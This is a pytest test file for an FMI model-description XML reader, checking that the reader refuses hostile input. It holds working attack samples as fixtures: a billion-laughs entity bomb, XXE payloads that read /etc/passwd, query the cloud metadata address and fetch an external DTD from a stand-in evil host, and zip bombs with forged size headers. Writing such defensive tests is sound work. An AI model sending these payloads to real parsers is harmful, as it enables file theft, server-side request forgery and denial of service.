"""Issue #4: hostile input raises UnsafeInput before it can do harm."""

from __future__ import annotations

import contextlib
import io
import json
import struct
import sys
import time
import tracemalloc
import zipfile
from collections.abc import Iterator
from pathlib import Path
from typing import IO, Any

import pytest

import mdxml
from mdxml import DEFAULT_MAX_XML_BYTES, MdxmlError, UnsafeInput, read_header

XML = Path(__file__).parent / "data" / "reference_fmus" / "BouncingBall" / "FMI2.xml"
XML_BYTES = XML.read_bytes()
EXPECTED = read_header(XML)

ROOT_OPEN = b'<fmiModelDescription fmiVersion="2.0" modelName="M" guid="{G}">'
ROOT_REST = b"<ModelVariables/></fmiModelDescription>"


def zip_with(entries: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for name, data in entries.items():
            archive.writestr(name, data)
    return buffer.getvalue()


def padded_xml(padding: int) -> bytes:
    """A valid Model Description with ``padding`` bytes of comment before <ModelVariables>."""
    return ROOT_OPEN + b"<!--" + b" " * padding + b"-->" + ROOT_REST


@pytest.fixture
def side_effects() -> Iterator[list[str]]:
    """Record file opens (other than Python's own imports) and network connects via an audit hook."""
    events: list[str] = []
    active = [True]

    def hook(event: str, args: tuple[object, ...]) -> None:
        if not active[0]:
            return
        if event == "open" and args and str(args[0]).startswith(("/etc", "C:\\Windows", "http")):
            events.append(f"open {args[0]}")
        elif event in {"socket.connect", "socket.getaddrinfo", "urllib.Request"}:
            events.append(event)

    sys.addaudithook(hook)  # audit hooks can't be removed, so the hook switches itself off
    try:
        yield events
    finally:
        active[0] = False


# --- Entity bombs ---------------------------------------------------------------------------

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE fmiModelDescription [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<fmiModelDescription fmiVersion="2.0" modelName="&lol9;" guid="g"><ModelVariables/></fmiModelDescription>
"""


def test_billion_laughs_is_refused_quickly_with_little_memory() -> None:
    tracemalloc.start()
    started = time.perf_counter()
    try:
        with pytest.raises(UnsafeInput, match="DOCTYPE"):
            read_header(BILLION_LAUGHS)
        elapsed = time.perf_counter() - started
        _, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()

    assert elapsed < 0.5
    assert peak < 1024 * 1024


def test_any_doctype_is_refused_even_without_entities() -> None:
    with pytest.raises(UnsafeInput, match="DOCTYPE"):
        read_header(b"<!DOCTYPE fmiModelDescription>" + ROOT_OPEN + ROOT_REST)


def test_unsafe_input_is_an_mdxml_error() -> None:
    with pytest.raises(MdxmlError):
        read_header(BILLION_LAUGHS)


def test_undeclared_entity_reference_is_a_parse_error_not_an_expansion() -> None:
    with pytest.raises(mdxml.ParseError, match="undefined entity"):
        read_header(b'<fmiModelDescription fmiVersion="2.0" modelName="&x;" guid="g"/>')


# --- External entities (XXE) ----------------------------------------------------------------

XXE_PAYLOADS = {
    "file": b'<!DOCTYPE m [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
    b'<fmiModelDescription fmiVersion="2.0" modelName="&x;" guid="g"/>',
    "http": b'<!DOCTYPE m [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
    b'<fmiModelDescription fmiVersion="2.0" modelName="&x;" guid="g"/>',
    "parameter entity": b'<!DOCTYPE m [<!ENTITY % p SYSTEM "http://example.invalid/evil.dtd"> %p;]>'
    b'<fmiModelDescription fmiVersion="2.0" modelName="m" guid="g"/>',
    "external dtd": b'<!DOCTYPE fmiModelDescription SYSTEM "http://example.invalid/evil.dtd">'
    b'<fmiModelDescription fmiVersion="2.0" modelName="m" guid="g"/>',
}


@pytest.mark.parametrize("payload", XXE_PAYLOADS.values(), ids=XXE_PAYLOADS.keys())
def test_external_entities_are_refused_without_side_effects(payload: bytes, side_effects: list[str]) -> None:
    with pytest.raises(UnsafeInput):
        read_header(payload)
    assert side_effects == []


def test_side_effect_detector_catches_opens(side_effects: list[str]) -> None:
    with contextlib.suppress(OSError):  # the event is recorded even if the file doesn't exist
        open("/etc/hostname", "rb").close()
    assert side_effects == ["open /etc/hostname"]


# --- max_xml_bytes --------------------------------------------------------------------------


def test_default_limit_is_256_mb() -> None:
    assert DEFAULT_MAX_XML_BYTES == 256 * 1024 * 1024


def test_raw_xml_over_the_limit_is_refused() -> None:
    data = padded_xml(2 * 1024 * 1024)
    with pytest.raises(UnsafeInput, match="max_xml_bytes=1048576"):
        read_header(data, max_xml_bytes=1024 * 1024)


def test_limit_can_be_raised_per_call() -> None:
    data = padded_xml(2 * 1024 * 1024)
    assert read_header(data, max_xml_bytes=3 * 1024 * 1024).model_name == "M"


def test_limit_can_be_lowered_per_call() -> None:
    with pytest.raises(UnsafeInput):
        read_header(XML_BYTES, max_xml_bytes=100)


def test_limit_counts_only_what_is_read_before_stopping() -> None:
    # The header ends at <ModelVariables>; a huge tail after it is never read, so it doesn't count.
    data = ROOT_OPEN + b"<ModelVariables>" + b" " * (2 * 1024 * 1024) + b"</ModelVariables></fmiModelDescription>"
    assert read_header(data, max_xml_bytes=1024 * 1024).model_name == "M"


def test_exactly_at_the_limit_is_allowed() -> None:
    assert read_header(XML_BYTES, max_xml_bytes=len(XML_BYTES)) == EXPECTED
    # A file smaller than one chunk is read whole, so one byte under its size is over the limit.
    with pytest.raises(UnsafeInput):
        read_header(XML_BYTES, max_xml_bytes=len(XML_BYTES) - 1)


@pytest.mark.parametrize("bad", [0, -1, 1.5, "10", True, None])
def test_invalid_limits_are_rejected(bad: object) -> None:
    with pytest.raises(ValueError, match="max_xml_bytes"):
        read_header(XML_BYTES, max_xml_bytes=bad)  # type: ignore[arg-type]


# --- Zip bombs ------------------------------------------------------------------------------


@pytest.fixture
def opened_entries(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    """Record the name of every zip entry opened for reading."""
    opened: list[str] = []
    original = zipfile.ZipFile.open

    def recording_open(self: zipfile.ZipFile, name: str | zipfile.ZipInfo, *args: Any, **kwargs: Any) -> IO[bytes]:
        mode = args[0] if args else kwargs.get("mode", "r")
        if mode == "r":  # ZipFile.writestr opens entries for writing; only reads count
            opened.append(name.filename if isinstance(name, zipfile.ZipInfo) else name)
        return original(self, name, *args, **kwargs)

    monkeypatch.setattr(zipfile.ZipFile, "open", recording_open)
    return opened


def test_zip_bomb_is_refused_without_decompressing_it(opened_entries: list[str]) -> None:
    bomb = zip_with({"modelDescription.xml": padded_xml(64 * 1024 * 1024)})
    assert len(bomb) < 100 * 1024  # 64 MB compresses to almost nothing

    with pytest.raises(UnsafeInput, match="decompresses to"):
        read_header(bomb, max_xml_bytes=1024 * 1024)

    assert opened_entries == []  # refused from the archive's metadata; not a byte was decompressed


def _understate_size(archive: bytes, name: str, claimed: int) -> bytes:
    """Rewrite the zip's uncompressed-size fields for ``name`` to ``claimed`` (a lying header)."""
    data = bytearray(archive)
    encoded = name.encode()
    local = data.index(b"PK\x03\x04")
    assert data[local + 30 : local + 30 + len(encoded)] == encoded
    struct.pack_into("<I", data, local + 22, claimed)
    central = data.index(b"PK\x01\x02")
    assert data[central + 46 : central + 46 + len(encoded)] == encoded
    struct.pack_into("<I", data, central + 24, claimed)
    return bytes(data)


def test_zip_entry_lying_about_its_size_cannot_get_past_the_limit() -> None:
    bomb = zip_with({"modelDescription.xml": padded_xml(8 * 1024 * 1024)})
    liar = _understate_size(bomb, "modelDescription.xml", claimed=1000)

    # zipfile stops at the claimed 1000 bytes, then the CRC check fails. No more than that is decompressed.
    with pytest.raises(mdxml.ParseError, match="corrupt zip data"):
        read_header(liar, max_xml_bytes=1024 * 1024)


def test_corrupt_deflate_stream_is_a_parse_error() -> None:
    archive = bytearray(zip_with({"modelDescription.xml": XML_BYTES}))
    data_start = archive.index(b"modelDescription.xml") + len("modelDescription.xml")
    archive[data_start : data_start + 64] = b"\xff" * 64  # garble the compressed bytes
    with pytest.raises(mdxml.ParseError):
        read_header(bytes(archive))


def test_other_archive_members_are_never_read(opened_entries: list[str]) -> None:
    other_bomb = padded_xml(64 * 1024 * 1024)
    fmu = zip_with({"modelDescription.xml": XML_BYTES, "resources/huge.bin": other_bomb})

    assert read_header(fmu, max_xml_bytes=1024 * 1024) == EXPECTED
    assert opened_entries == ["modelDescription.xml"]


# --- CLI ------------------------------------------------------------------------------------


def test_cli_max_xml_bytes(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    path = tmp_path / "big.xml"
    path.write_bytes(padded_xml(2 * 1024 * 1024))

    assert mdxml.main(["header", str(path), "--max-xml-bytes", "1048576"]) == 1
    assert "max_xml_bytes" in capsys.readouterr().err

    assert mdxml.main(["header", str(path), "--max-xml-bytes", str(3 * 1024 * 1024)]) == 0
    assert json.loads(capsys.readouterr().out)["model_name"] == "M"
